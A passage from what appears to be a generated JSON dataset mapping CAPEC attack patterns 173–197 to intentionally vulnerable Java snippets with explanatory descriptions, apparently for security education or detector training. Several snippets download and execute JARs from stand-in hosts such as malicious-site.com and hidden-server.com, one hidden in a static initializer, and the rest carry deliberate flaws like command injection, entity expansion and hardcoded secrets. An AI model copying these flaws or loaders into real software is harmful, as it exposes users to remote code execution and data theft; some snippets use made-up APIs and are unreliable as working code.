        "description": "This code demonstrates unsafe dynamic variable evaluation by allowing user input to influence variable names at runtime and using eval-like functionality through ScriptEngine. The code accepts unvalidated user input to construct variable names and expressions, which are then evaluated dynamically, making it vulnerable to injection attacks and unauthorized variable access."
    },
    {
        "capec_id": "173",
        "capec_name": "Action Spoofing",
        "code_snippet": "public class MaliciousDownloadUI extends JFrame {\n    public MaliciousDownloadUI() {\n        JButton button = new JButton(\"Search Results\");\n        button.addActionListener(e -> {\n            try {\n                // Misleading UI - button appears to show search results\n                // but actually downloads and executes content\n                URL url = new URL(\"http://malicious-site.com/malware.jar\");\n                URLConnection conn = url.openConnection();\n                InputStream in = conn.getInputStream();\n                File file = new File(\"search_results.jar\");\n                FileOutputStream out = new FileOutputStream(file);\n                byte[] buffer = new byte[1024];\n                int length;\n                while ((length = in.read(buffer)) > 0) {\n                    out.write(buffer, 0, length);\n                }\n                out.close();\n                in.close();\n                Runtime.getRuntime().exec(\"java -jar search_results.jar\");\n            } catch (Exception ex) {\n                ex.printStackTrace();\n            }\n        });\n        add(button);\n        setSize(300, 200);\n        setDefaultCloseOperation(JFrame.EXIT_ON_CLOSE);\n    }\n}",
        "description": "This code demonstrates UI misrepresentation where a button labeled as 'Search Results' actually initiates a malicious file download and execution. The user interface misleads users about the true action being performed, exploiting their trust in the UI elements. The code downloads a potentially malicious JAR file and executes it without proper verification or user consent, combining elements of UI misrepresentation (CWE-451) and improper verification of intent (CWE-925)."
    },
    {
        "capec_id": "174",
        "capec_name": "Flash Parameter Injection",
        "code_snippet": "public class FlashUploadServlet extends HttpServlet {\n    protected void doPost(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException {\n        String flashParams = request.getParameter(\"flashVars\");\n        String uploadDir = \"/web/flash/uploads/\";\n        String fileName = request.getParameter(\"fileName\");\n        \n        // Directly using user input in flash parameters\n        String flashContent = \"<object type='application/x-shockwave-flash'>\"\n            + \"<param name='movie' value='player.swf' />\"\n            + \"<param name='flashVars' value='\" + flashParams + \"' />\"\n            + \"</object>\";\n            \n        // Unsafe file upload handling\n        Part filePart = request.getPart(\"file\");\n        filePart.write(uploadDir + fileName);\n        \n        // Unsafe cross-domain policy\n        String crossDomainPolicy = \"<?xml version='1.0'?>\"\n            + \"<cross-domain-policy>\"\n            + \"<allow-access-from domain='*' />\"\n            + \"</cross-domain-policy>\";\n            \n        response.setContentType(\"text/html\");\n        response.getWriter().write(flashContent);\n    }\n}",
        "description": "This code demonstrates multiple vulnerabilities related to Flash file handling and unsafe parameter processing. It accepts unvalidated flashVars parameters, allows unrestricted file uploads, and implements a permissive cross-domain policy. The code doesn't sanitize user input before embedding it in Flash parameters, doesn't validate file types during upload, and allows access from any domain through a loose cross-domain policy."
    },
    {
        "capec_id": "175",
        "capec_name": "Code Inclusion",
        "code_snippet": "public class RemoteLoader {\n    public static void loadAndExecuteCode(String remoteUrl) {\n        try {\n            URL url = new URL(remoteUrl);\n            URLClassLoader classLoader = new URLClassLoader(new URL[]{url});\n            Class<?> loadedClass = classLoader.loadClass(\"MaliciousCode\");\n            Object instance = loadedClass.newInstance();\n            Method method = loadedClass.getMethod(\"execute\");\n            method.invoke(instance);\n        } catch (Exception e) {\n            e.printStackTrace();\n        }\n    }\n    \n    public static void main(String[] args) {\n        String userInput = args[0];\n        loadAndExecuteCode(userInput);\n    }\n}",
        "description": "This code is vulnerable as it allows loading and executing arbitrary Java classes from a remote URL specified by user input without any validation. An attacker could provide a malicious URL containing harmful code that would be dynamically loaded and executed within the application's context."
    },
    {
        "capec_id": "176",
        "capec_name": "Configuration/Environment Manipulation",
        "code_snippet": "public class SystemConfigManager {\n    private static final String CONFIG_FILE_PATH = \"system.config\";\n    private static boolean isDebugMode = false;\n    private static int securityVersion = 1;\n    \n    public static void loadConfiguration() {\n        try {\n            Properties props = new Properties();\n            props.load(new FileInputStream(CONFIG_FILE_PATH));\n            \n            // Directly apply external configuration without validation\n            System.setProperty(\"security.level\", props.getProperty(\"security.level\"));\n            System.setProperty(\"debug.mode\", props.getProperty(\"debug.mode\"));\n            securityVersion = Integer.parseInt(props.getProperty(\"security.version\"));\n            \n            if(Boolean.parseBoolean(props.getProperty(\"debug.mode\"))) {\n                isDebugMode = true;\n                // Debug mode bypasses all security checks\n                applyDebugSettings();\n            }\n        } catch (Exception e) {\n            // Silent failure, using default settings\n        }\n    }\n    \n    private static void applyDebugSettings() {\n        // Debug mode allows override of locked settings\n        System.setProperty(\"security.locks.enabled\", \"false\");\n        securityVersion = 0; // Reset security version in debug mode\n    }\n    \n    public static void setSecurityVersion(int version) {\n        // No validation of version number, allowing downgrades\n        securityVersion = version;\n    }\n}",
        "description": "This vulnerable code demonstrates several security issues: external control of system configuration through an unvalidated config file, debug mode that bypasses security locks, mutable security version allowing downgrades, and unsafe handling of system configuration settings. The code doesn't validate input, allows debug mode to override security controls, and permits security version downgrades without verification."
    },
    {
        "capec_id": "177",
        "capec_name": "Create files with the same name as files protected with a higher classification",
        "code_snippet": "public class FileLoader {\n    private static final String CONFIG_DIR = \"config\";\n\n    public static void loadConfig(String configFileName) {\n        try {\n            String filePath = CONFIG_DIR + \"/\" + configFileName;\n            File configFile = new File(filePath);\n            \n            // Vulnerable: No validation of file path or name\n            FileInputStream fis = new FileInputStream(configFile);\n            Properties props = new Properties();\n            props.load(fis);\n            \n            // Use the loaded properties for application configuration\n            applyConfiguration(props);\n            \n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n\n    private static void applyConfiguration(Properties props) {\n        // Apply configuration settings\n        System.setProperty(\"app.mode\", props.getProperty(\"mode\"));\n    }\n}",
        "description": "This vulnerable code demonstrates insecure file loading where an attacker can exploit path traversal by providing malicious file names (e.g., '../malicious.properties'). The code doesn't validate the file path or name, doesn't check for directory traversal attempts, and blindly trusts the input filename. An attacker could place a malicious configuration file in a location that would be found first in the file system search path, leading to the loading of unauthorized configuration data."
    },
    {
        "capec_id": "178",
        "capec_name": "Cross-Site Flashing",
        "code_snippet": "public class FlashContentHandler extends HttpServlet {\n    protected void doGet(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException {\n        String swfUrl = request.getParameter(\"swfPath\");\n        String callback = request.getParameter(\"callback\");\n        \n        response.setHeader(\"Content-Type\", \"application/x-shockwave-flash\");\n        response.setHeader(\"X-Permitted-Cross-Domain-Policies\", \"all\");\n        \n        PrintWriter out = response.getWriter();\n        out.println(\"<object type='application/x-shockwave-flash' data='\" + swfUrl + \"'>\")\n        out.println(\"<param name='allowScriptAccess' value='always' />\")\n        out.println(\"<param name='movie' value='\" + swfUrl + \"' />\")\n        out.println(\"<param name='FlashVars' value='callback=\" + callback + \"' />\")\n        out.println(\"</object>\");\n    }\n}",
        "description": "This vulnerable code accepts untrusted user input for Flash content URLs and callback parameters without proper validation. It sets permissive cross-domain policies and doesn't sanitize input, allowing potential XSS attacks through Flash variables. The code enables unrestricted script access and doesn't validate the target URLs, making it susceptible to open redirects and malicious Flash content execution."
    },
    {
        "capec_id": "179",
        "capec_name": "Calling Micro-Services Directly",
        "code_snippet": "public class MicroserviceEndpoint {\n    @GET\n    @Path(\"/userdata/{userId}\")\n    public Response getUserData(@PathParam(\"userId\") String userId,\n                              @QueryParam(\"authToken\") String authToken) {\n        String sensitiveData = \"\";\n        try {\n            // Store sensitive data in web-accessible directory\n            File userFile = new File(\"/var/www/html/data/\" + userId + \".json\");\n            \n            // No server-side validation, relying on client checks\n            if(authToken != null) {\n                sensitiveData = loadUserData(userId);\n                \n                // Set persistent cookie with sensitive info\n                NewCookie cookie = new NewCookie(\"userData\",\n                    sensitiveData,\n                    \"/\",\n                    null,\n                    1,\n                    \"sensitive-data\",\n                    604800,\n                    false);\n                \n                return Response.ok(sensitiveData)\n                    .cookie(cookie)\n                    .header(\"X-Implementation-Details\", \"Java-Microservice-v1.0\")\n                    .build();\n            }\n            return Response.status(Response.Status.UNAUTHORIZED).build();\n        } catch(Exception e) {\n            return Response.serverError().build();\n        }\n    }\n}",
        "description": "This vulnerable code demonstrates a microservice endpoint that exposes sensitive information through multiple vectors: storing sensitive files in web-accessible locations, using GET requests with sensitive parameters, revealing implementation details through headers, storing sensitive data in persistent cookies, and relying on client-side security checks. The endpoint lacks proper server-side validation and exposes internal implementation details that could aid in further exploitation."
    },
    {
        "capec_id": "180",
        "capec_name": "Exploiting Incorrectly Configured Access Control Security Levels",
        "code_snippet": "public class SystemAccessControl {\n    private static boolean isInitialized = false;\n\n    public static void initializeSystem() {\n        // Prematurely enable DMA access before security is configured\n        enableDMAAccess();\n        \n        // Critical resources with incorrect permissions\n        File secureConfig = new File(\"/etc/secure/config\");\n        secureConfig.setReadable(true, false);\n        secureConfig.setWritable(true, false);\n\n        // Access check happens after resource access\n        accessSensitiveData();\n        if(!checkAccessPermissions()) {\n            return;\n        }\n\n        isInitialized = true;\n    }\n\n    private static void enableDMAAccess() {\n        // Enable DMA before security settings are established\n        DirectMemoryAccess.enable();\n    }\n\n    private static void accessSensitiveData() {\n        // Access data before permission check\n        SystemData.read();\n    }\n\n    private static boolean checkAccessPermissions() {\n        return SecurityManager.getCurrentUser().hasPermission(\"READ\");\n    }\n}",
        "description": "This code demonstrates multiple access control vulnerabilities including premature DMA enablement, incorrect file permissions for critical resources, and performing access checks after the resource has already been accessed. The code shows improper security initialization sequence and overly permissive access controls that could be exploited by attackers to gain unauthorized access."
    },
    {
        "capec_id": "181",
        "capec_name": "Flash File Overlay",
        "code_snippet": "public class VulnerableWebPage extends HttpServlet {\n    protected void doGet(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException {\n        String userContent = request.getParameter(\"content\");\n        response.setContentType(\"text/html\");\n        PrintWriter out = response.getWriter();\n        \n        out.println(\"<!DOCTYPE html>\");\n        out.println(\"<html>\");\n        out.println(\"<head>\");\n        // Permissive Flash crossdomain policy\n        out.println(\"<meta http-equiv=\\\"X-UA-Compatible\\\" content=\\\"IE=edge\\\">\");\n        out.println(\"<script>function allowFlashOverlay() { return true; }</script>\");\n        out.println(\"</head>\");\n        out.println(\"<body>\");\n        // Directly embedding user content without sanitization\n        out.println(\"<div id='userContent'>\" + userContent + \"</div>\");\n        // Allowing any Flash content to be loaded\n        out.println(\"<object type='application/x-shockwave-flash' data='\" + \n                    request.getParameter(\"flash\") + \"'>\");\n        out.println(\"<param name='wmode' value='transparent'/>\");\n        out.println(\"</object>\");\n        out.println(\"</body></html>\");\n    }\n}",
        "description": "This code is vulnerable to clickjacking and XSS attacks by allowing unrestricted Flash content to be loaded with a transparent overlay and embedding unsanitized user input directly into the page. It also implements a permissive cross-domain policy that allows any Flash content to be loaded and displayed over the main content."
    },
    {
        "capec_id": "182",
        "capec_name": "Flash Injection",
        "code_snippet": "public class FlashContentLoader {\n    public void loadExternalFlash(String flashUrl) {\n        // No validation of flashUrl\n        String crossDomainPolicy = \"*\";  // Allows all domains\n        \n        try {\n            FlashPlayer player = new FlashPlayer();\n            player.setAllowScriptAccess(\"always\");\n            player.setCrossDomainPolicy(crossDomainPolicy);\n            \n            // Directly loads flash content from untrusted URL\n            player.loadMovie(flashUrl);\n            \n            // Executes flash without checking content\n            player.play();\n        } catch (Exception e) {\n            e.printStackTrace();\n        }\n    }\n\n    public boolean isAllowedDomain(String domain) {\n        // Incomplete blacklist of disallowed domains\n        String[] blacklist = {\"evil.com\"};\n        \n        // Incorrect comparison - case sensitive\n        for (String blocked : blacklist) {\n            if (domain.equals(blocked)) {\n                return false;\n            }\n        }\n        return true;\n    }\n}",
        "description": "This vulnerable code demonstrates a Flash content loader that fails to properly validate input URLs, uses a permissive cross-domain policy, and implements incomplete domain validation. It allows arbitrary Flash content to be loaded and executed with full privileges, enabling cross-site flashing attacks."
    },
    {
        "capec_id": "183",
        "capec_name": "IMAP/SMTP Command Injection",
        "code_snippet": "public class EmailService {\n    private String mailServer = \"mail.example.com\";\n    \n    public void sendMail(String recipient, String subject, String body) {\n        try {\n            String command = \"echo '\" + body + \"' | mail -s '\" + subject + \"' \" + recipient;\n            Runtime.getRuntime().exec(command);\n        } catch (Exception e) {\n            System.err.println(\"Mail server error: \" + e.getMessage() + \n                            \"\\nServer: \" + mailServer + \n                            \"\\nCommand failed: \" + command);\n        }\n    }\n    \n    public boolean authenticateUser(String username, String password) {\n        try {\n            String command = \"imapcheck \" + username + \" \" + password;\n            Process process = Runtime.getRuntime().exec(command);\n            return process.waitFor() == 0;\n        } catch (Exception e) {\n            return false;\n        }\n    }\n}",
        "description": "This vulnerable code demonstrates an IMAP/SMTP command injection vulnerability. It directly concatenates user input into shell commands without proper sanitization, allowing attackers to inject malicious commands. It also exposes sensitive information in error messages and relies on client-side input for server-side operations. The authentication mechanism is vulnerable to command injection through username and password fields."
    },
    {
        "capec_id": "184",
        "capec_name": "Software Integrity Attack",
        "code_snippet": "public class UnsafeCodeDownloader {\n    public static void main(String[] args) {\n        try {\n            // Download and execute code from an untrusted source without verification\n            URL url = new URL(\"http://untrusted-source.com/code.jar\");\n            URLConnection conn = url.openConnection();\n            InputStream is = conn.getInputStream();\n            \n            // Load and execute the downloaded code without integrity check\n            File tempFile = File.createTempFile(\"downloaded\", \".jar\");\n            FileOutputStream fos = new FileOutputStream(tempFile);\n            byte[] buffer = new byte[1024];\n            int read;\n            while ((read = is.read(buffer)) != -1) {\n                fos.write(buffer, 0, read);\n            }\n            fos.close();\n            \n            // Execute the downloaded code directly\n            URLClassLoader classLoader = new URLClassLoader(new URL[]{tempFile.toURI().toURL()});\n            Class<?> loadedClass = classLoader.loadClass(\"MaliciousCode\");\n            loadedClass.getDeclaredMethod(\"execute\").invoke(null);\n            \n            // Expose sensitive system information\n            System.out.println(\"System Properties: \" + System.getProperties());\n            System.out.println(\"Environment Variables: \" + System.getenv());\n        } catch (Exception e) {\n            e.printStackTrace();\n        }\n    }\n}",
        "description": "This vulnerable code demonstrates downloading and executing code from an untrusted source without integrity verification, potentially allowing malicious code execution. It also exposes sensitive system information. The code lacks proper verification mechanisms, making it susceptible to integrity attacks and unauthorized code execution. Additionally, it freely exposes system properties and environment variables to potentially malicious code."
    },
    {
        "capec_id": "185",
        "capec_name": "Malicious Software Download",
        "code_snippet": "public class UpdateChecker {\n    public static void downloadAndInstallUpdate() {\n        try {\n            URL updateUrl = new URL(\"http://malicious-update-server.com/update.jar\");\n            URLConnection conn = updateUrl.openConnection();\n            InputStream is = conn.getInputStream();\n            File updateFile = new File(\"update.jar\");\n            \n            FileOutputStream fos = new FileOutputStream(updateFile);\n            byte[] buffer = new byte[1024];\n            int bytesRead;\n            while ((bytesRead = is.read(buffer)) != -1) {\n                fos.write(buffer, 0, bytesRead);\n            }\n            fos.close();\n            is.close();\n\n            // Execute downloaded JAR without verification\n            Runtime.getRuntime().exec(\"java -jar update.jar\");\n        } catch (Exception e) {\n            e.printStackTrace();\n        }\n    }\n}",
        "description": "This code demonstrates an insecure update mechanism that downloads and executes code from a remote server without any integrity checks or verification. It downloads a JAR file from a potentially malicious source and executes it with system privileges, which could contain trojans, viruses, or other malicious code. The code also lacks any authentication or validation of the source, making it vulnerable to man-in-the-middle attacks and malicious code execution."
    },
    {
        "capec_id": "186",
        "capec_name": "Malicious Software Update",
        "code_snippet": "public class UpdateManager {\n    public static void downloadAndInstallUpdate(String updateUrl) {\n        try {\n            URL url = new URL(updateUrl);\n            URLConnection conn = url.openConnection();\n            InputStream is = conn.getInputStream();\n            \n            File updateFile = new File(\"update.jar\");\n            FileOutputStream fos = new FileOutputStream(updateFile);\n            \n            byte[] buffer = new byte[1024];\n            int bytesRead;\n            while ((bytesRead = is.read(buffer)) != -1) {\n                fos.write(buffer, 0, bytesRead);\n            }\n            fos.close();\n            is.close();\n            \n            // Execute the downloaded file without verification\n            Runtime.getRuntime().exec(\"java -jar update.jar\");\n        } catch (Exception e) {\n            e.printStackTrace();\n        }\n    }\n}",
        "description": "This vulnerable code downloads and executes a JAR file from a specified URL without performing any integrity checks or verification of the source. It directly writes the downloaded content to disk and executes it with full privileges, making it susceptible to malicious code injection through fake updates. The code lacks digital signature verification, checksums, or any other security measures to ensure the update is legitimate."
    },
    {
        "capec_id": "187",
        "capec_name": "Malicious Automated Software Update via Redirection",
        "code_snippet": "public class AutoUpdater {\n    private static final String UPDATE_SERVER = \"http://update-server.com\";\n\n    public void checkAndUpdate() {\n        try {\n            URL url = new URL(UPDATE_SERVER + \"/latest.jar\");\n            URLConnection conn = url.openConnection();\n            \n            // No SSL/TLS verification\n            if(conn instanceof HttpsURLConnection) {\n                ((HttpsURLConnection) conn).setHostnameVerifier((hostname, session) -> true);\n            }\n            \n            // Download and execute update without verification\n            try (InputStream in = conn.getInputStream()) {\n                byte[] updateBytes = in.readAllBytes();\n                \n                // Save update file\n                FileOutputStream fos = new FileOutputStream(\"update.jar\");\n                fos.write(updateBytes);\n                fos.close();\n                \n                // Execute update without verification\n                Runtime.getRuntime().exec(\"java -jar update.jar\");\n            }\n        } catch (Exception e) {\n            e.printStackTrace();\n        }\n    }\n}",
        "description": "This vulnerable code implements an auto-update mechanism that downloads and executes code from a remote server without proper authentication or integrity verification. It disables SSL hostname verification, doesn't validate the source server's identity, and executes downloaded code without checking signatures or hashes. This makes it susceptible to man-in-the-middle attacks and malicious code injection through a compromised update server or network connection."
    },
    {
        "capec_id": "188",
        "capec_name": "Reverse Engineering",
        "code_snippet": "public class SecureDevice {\n    private static final String WEAK_KEY = \"0123456789ABCDEF\";\n    private static final String FIRMWARE_VERSION = \"1.0\";\n    \n    @Deprecated\n    private void debugBackdoor(String command) {\n        // Hidden debug interface left in production\n        executePrivilegedCommand(command);\n    }\n    \n    private String encryptData(String data) {\n        // Using weak DES encryption\n        try {\n            Cipher cipher = Cipher.getInstance(\"DES/ECB/PKCS5Padding\");\n            SecretKeySpec key = new SecretKeySpec(WEAK_KEY.getBytes(), \"DES\");\n            cipher.init(Cipher.ENCRYPT_MODE, key);\n            return Base64.getEncoder().encodeToString(cipher.doFinal(data.getBytes()));\n        } catch (Exception e) {\n            return data; // Fallback to plaintext on error\n        }\n    }\n    \n    public String getSystemInfo() {\n        StringBuilder info = new StringBuilder();\n        info.append(\"OS: \").append(System.getProperty(\"os.name\"));\n        info.append(\"\\nJVM Version: \").append(System.getProperty(\"java.version\"));\n        info.append(\"\\nSystem Architecture: \").append(System.getProperty(\"os.arch\"));\n        info.append(\"\\nUser Home: \").append(System.getProperty(\"user.home\"));\n        return info.toString();\n    }\n}",
        "description": "This vulnerable code demonstrates multiple security issues related to reverse engineering protection. It includes a weak cryptographic implementation using DES, exposes sensitive system information through getSystemInfo(), contains an undocumented backdoor method, and uses hardcoded encryption keys. The code makes it easier for attackers to reverse engineer the system's functionality through static and dynamic analysis."
    },
    {
        "capec_id": "189",
        "capec_name": "Black Box Reverse Engineering",
        "code_snippet": "public class SecureTokenValidator {\n    private static final String SECRET_TOKEN = \"abc123xyz789\";\n\n    public boolean validateToken(String userInput) {\n        boolean isValid = false;\n        for(int i = 0; i < SECRET_TOKEN.length(); i++) {\n            if(i < userInput.length() && userInput.charAt(i) == SECRET_TOKEN.charAt(i)) {\n                // Artificial delay based on match\n                try {\n                    Thread.sleep(10);\n                } catch(InterruptedException e) {}\n                isValid = true;\n            } else {\n                isValid = false;\n                break;\n            }\n        }\n        System.out.println(\"Validation result: \" + isValid);\n        return isValid;\n    }\n}",
        "description": "This code snippet demonstrates vulnerable token validation that is susceptible to timing analysis and side-channel attacks. The character-by-character comparison with artificial delays creates observable timing differences based on the number of correct characters. Additionally, the system output reveals validation results, potentially leaking information about the internal state. An attacker could analyze timing patterns and system responses to gradually determine the secret token."
    },
    {
        "capec_id": "190",
        "capec_name": "Reverse Engineer an Executable to Expose Assumed Hidden Functionality",
        "code_snippet": "public class SecretLoader {\n    private static final String HIDDEN_ENDPOINT = \"http://hidden-server.com/payload\";\n    \n    static {\n        try {\n            // Hidden functionality that downloads and executes code\n            URL url = new URL(HIDDEN_ENDPOINT);\n            URLConnection conn = url.openConnection();\n            BufferedReader reader = new BufferedReader(new InputStreamReader(conn.getInputStream()));\n            \n            StringBuilder payload = new StringBuilder();\n            String line;\n            while ((line = reader.readLine()) != null) {\n                payload.append(line);\n            }\n            \n            // Execute downloaded code without verification\n            Base64.Decoder decoder = Base64.getDecoder();\n            byte[] decodedBytes = decoder.decode(payload.toString());\n            \n            // Create a temporary file and execute it\n            File temp = File.createTempFile(\"loader\", \".jar\");\n            FileOutputStream fos = new FileOutputStream(temp);\n            fos.write(decodedBytes);\n            fos.close();\n            \n            // Load and execute the downloaded code\n            URLClassLoader classLoader = new URLClassLoader(new URL[]{temp.toURI().toURL()});\n            Class<?> loadedClass = classLoader.loadClass(\"com.malicious.Payload\");\n            loadedClass.getDeclaredMethod(\"execute\").invoke(null);\n        } catch (Exception e) {\n            // Suppress all exceptions to hide functionality\n        }\n    }\n}",
        "description": "This code contains hidden functionality that downloads and executes arbitrary code from a remote server without integrity verification. It uses a static initializer to hide the functionality, suppresses all error messages, and executes downloaded code with no validation. The code exemplifies vulnerabilities related to hidden functionality (CWE-912), exposure of sensitive information (CWE-497), and download of code without integrity checks (CWE-494)."
    },
    {
        "capec_id": "191",
        "capec_name": "Read Sensitive Constants Within an Executable",
        "code_snippet": "public class DatabaseConnector {\n    private static final String DB_PASSWORD = \"s3cr3tP@ssw0rd\";\n    private static final String ENCRYPTION_KEY = \"AES256_KEY_1234567890\";\n    private static final String ADMIN_TOKEN = \"admin_token_12345\";\n    \n    public boolean authenticateUser(String username) {\n        if (username.equals(\"admin\")) {\n            return verifyAdminAccess(ADMIN_TOKEN);\n        }\n        return connectToDatabase(DB_PASSWORD);\n    }\n    \n    private boolean connectToDatabase(String password) {\n        // Database connection logic using hard-coded password\n        return true;\n    }\n    \n    private boolean verifyAdminAccess(String token) {\n        // Admin verification using hard-coded token\n        return token.equals(ADMIN_TOKEN);\n    }\n    \n    public String encryptData(String data) {\n        // Encryption using hard-coded key\n        return data + ENCRYPTION_KEY;\n    }\n}",
        "description": "This code demonstrates multiple security vulnerabilities related to hard-coded credentials and sensitive constants. It includes hard-coded database password, encryption key, and admin token directly in the source code, making them easily discoverable through reverse engineering or decompilation. The sensitive information is stored as cleartext string constants rather than being stored securely or retrieved from a configuration system."
    },
    {
        "capec_id": "192",
        "capec_name": "Protocol Analysis",
        "code_snippet": "public class InsecureProtocolHandler {\n    private static final String WEAK_CIPHER = \"DES\";\n    \n    public void initializeConnection(Socket socket) throws Exception {\n        String[] supportedCiphers = {\"AES256\", \"AES128\", \"DES\"};\n        DataOutputStream out = new DataOutputStream(socket.getOutputStream());\n        DataInputStream in = new DataInputStream(socket.getInputStream());\n        \n        // Send supported ciphers in cleartext\n        out.writeUTF(Arrays.toString(supportedCiphers));\n        \n        // Accept any cipher from client, including weak ones\n        String selectedCipher = in.readUTF();\n        \n        // Transmit sensitive data using potentially weak encryption\n        String sensitiveData = \"username=admin;password=secret123\";\n        Cipher cipher = Cipher.getInstance(selectedCipher);\n        SecretKey key = KeyGenerator.getInstance(selectedCipher).generateKey();\n        cipher.init(Cipher.ENCRYPT_MODE, key);\n        \n        // Send encryption key in cleartext\n        out.write(key.getEncoded());\n        out.writeUTF(sensitiveData);\n    }\n}",
        "description": "This vulnerable code demonstrates multiple security issues in protocol handling: it allows negotiation of weak encryption algorithms (DES), transmits sensitive data and encryption keys in cleartext, and doesn't validate the selected cipher strength. The code also makes assumptions about data layout and transmission order without proper validation."
    },
    {
        "capec_id": "193",
        "capec_name": "PHP Remote File Inclusion",
        "code_snippet": "public class FileHandler extends HttpServlet {\n    protected void doGet(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException {\n        String filePath = request.getParameter(\"file\");\n        String basePath = \"/var/www/uploads/\";\n        \n        try {\n            String content = new String(Files.readAllBytes(Paths.get(basePath + filePath)));\n            response.setContentType(\"text/html\");\n            response.getWriter().write(content);\n            \n            if(filePath.endsWith(\".php\")) {\n                Process proc = Runtime.getRuntime().exec(\"php \" + basePath + filePath);\n                BufferedReader reader = new BufferedReader(new InputStreamReader(proc.getInputStream()));\n                String line;\n                while((line = reader.readLine()) != null) {\n                    response.getWriter().write(line);\n                }\n            }\n        } catch(Exception e) {\n            response.getWriter().write(\"Error loading file: \" + e.getMessage());\n        }\n    }\n}",
        "description": "This vulnerable code allows remote file inclusion by accepting a file parameter without proper validation, potentially executing PHP files from any location. It demonstrates CWE-98 by not restricting the file parameter, CWE-80 by not sanitizing output, CWE-646 by relying on file extension for execution decisions, and CWE-433 by delivering raw content without proper parsing."
    },
    {
        "capec_id": "194",
        "capec_name": "Fake the Source of Data",
        "code_snippet": "public class EmailSystem {\n    public static boolean sendEmail(String fromAddress, String content) {\n        // No verification of sender identity\n        EmailMessage message = new EmailMessage();\n        message.setFrom(fromAddress);  // Accepts any provided address without validation\n        message.setContent(content);\n        \n        // Basic unencrypted transmission\n        try {\n            Socket socket = new Socket(\"smtp.server.com\", 25);\n            PrintWriter out = new PrintWriter(socket.getOutputStream(), true);\n            out.println(\"MAIL FROM: \" + fromAddress);\n            out.println(\"DATA\");\n            out.println(content);\n            out.println(\".\");\n            return true;\n        } catch(Exception e) {\n            return false;\n        }\n    }\n\n    public static void main(String[] args) {\n        // Attacker can easily spoof sender address\n        sendEmail(\"ceo@company.com\", \"Transfer $10000 to account XXX\");\n    }\n}",
        "description": "This vulnerable code demonstrates a flawed email system implementation that allows sender spoofing. It lacks proper authentication of the sender's identity and uses unencrypted communication channels. The system accepts any provided email address without verification and sends messages over an insecure connection, making it susceptible to identity spoofing and message tampering during transmission."
    },
    {
        "capec_id": "195",
        "capec_name": "Principal Spoof",
        "code_snippet": "public class EmailAuthenticator {\n    private static final String TRUSTED_DOMAIN = \"company.com\";\n    \n    public boolean authenticateUser(String emailHeader, String message) {\n        // Vulnerable: Only checks if email appears to be from trusted domain\n        // without proper cryptographic verification\n        if (emailHeader.endsWith(\"@\" + TRUSTED_DOMAIN)) {\n            if (message.contains(\"Authorization-Code:\")) {\n                String authCode = message.split(\"Authorization-Code:\")[1].trim();\n                // Vulnerable: No verification of actual sender identity\n                return processAuthCode(authCode);\n            }\n        }\n        return false;\n    }\n    \n    private boolean processAuthCode(String authCode) {\n        // Vulnerable: No challenge-response mechanism\n        // Simply accepts any well-formatted code\n        return authCode.length() == 8 && authCode.matches(\"[A-Z0-9]+\");\n    }\n}",
        "description": "This code demonstrates a vulnerable email-based authentication system that can be exploited through principal spoofing. It only performs superficial checks on the email domain and authorization code format, without proper cryptographic verification of the sender's identity. The system is vulnerable to email header spoofing and lacks proper entity authentication, making it susceptible to reflection attacks and authentication bypass through spoofing."
    },
    {
        "capec_id": "196",
        "capec_name": "Session Credential Falsification through Forging",
        "code_snippet": "public class SessionManager {\n    private static Map<String, String> sessions = new HashMap<>();\n    \n    public static String createSession(String username) {\n        // Using predictable session ID generation\n        String sessionId = username + System.currentTimeMillis();\n        sessions.put(sessionId, username);\n        return sessionId;\n    }\n    \n    public static boolean validateSession(String sessionId) {\n        // No session expiration check\n        // No session fixation prevention\n        return sessions.containsKey(sessionId);\n    }\n    \n    public static void login(String username, String password) {\n        // Transmitting credentials in plain text\n        HttpURLConnection conn = (HttpURLConnection) new URL(\"http://example.com/login\").openConnection();\n        String credentials = username + \":\" + password;\n        conn.setRequestProperty(\"Authorization\", \"Basic \" + Base64.getEncoder().encodeToString(credentials.getBytes()));\n        \n        // Not invalidating existing sessions\n        String sessionId = createSession(username);\n    }\n}",
        "description": "This vulnerable code demonstrates multiple session management issues: predictable session ID generation, lack of session expiration, no protection against session fixation, plain text credential transmission, and failure to invalidate existing sessions during login. The session IDs are created using a simple concatenation of username and timestamp, making them potentially guessable. There's no mechanism to expire sessions or protect against session fixation attacks, and credentials are transmitted over HTTP without encryption."
    },
    {
        "capec_id": "197",
        "capec_name": "Exponential Data Expansion",
        "code_snippet": "public class XMLProcessor {\n    public void processXML(String input) {\n        try {\n            DocumentBuilderFactory factory = DocumentBuilderFactory.newInstance();\n            factory.setFeature(\"http://apache.org/xml/features/nonvalidating/load-external-dtd\", true);\n            factory.setExpandEntityReferences(true);\n            DocumentBuilder builder = factory.newDocumentBuilder();\n            \n            // Vulnerable: No limits on entity expansion\n            Document doc = builder.parse(new InputSource(new StringReader(input)));\n            \n            // Process deeply nested data without checks\n            processNode(doc.getDocumentElement(), 0);\n        } catch (Exception e) {\n            e.printStackTrace();\n        }\n    }\n    \n    private void processNode(Node node, int depth) {\n        // Recursive processing without depth limit\n        NodeList children = node.getChildNodes();\n        for (int i = 0; i < children.getLength(); i++) {\n            Node child = children.item(i);\n            // Create large data structure for each node\n            List<Object> nodeData = new ArrayList<>();\n            for (int j = 0; j < depth * 1000; j++) {\n                nodeData.add(new Object());\n            }\n            processNode(child, depth + 1);\n        }\n    }\n}",
        "description": "This code demonstrates vulnerability to XML entity expansion attacks and resource exhaustion through recursive processing of nested XML structures. It allows unrestricted entity expansion in XML parsing, performs unbounded recursive processing of nested nodes, and creates large data structures without size limits. The code is susceptible to billion laughs attacks and can lead to denial of service through memory exhaustion."
    },
    {
        "capec_id": "198",
        "capec_name": "XSS Targeting Error Pages",
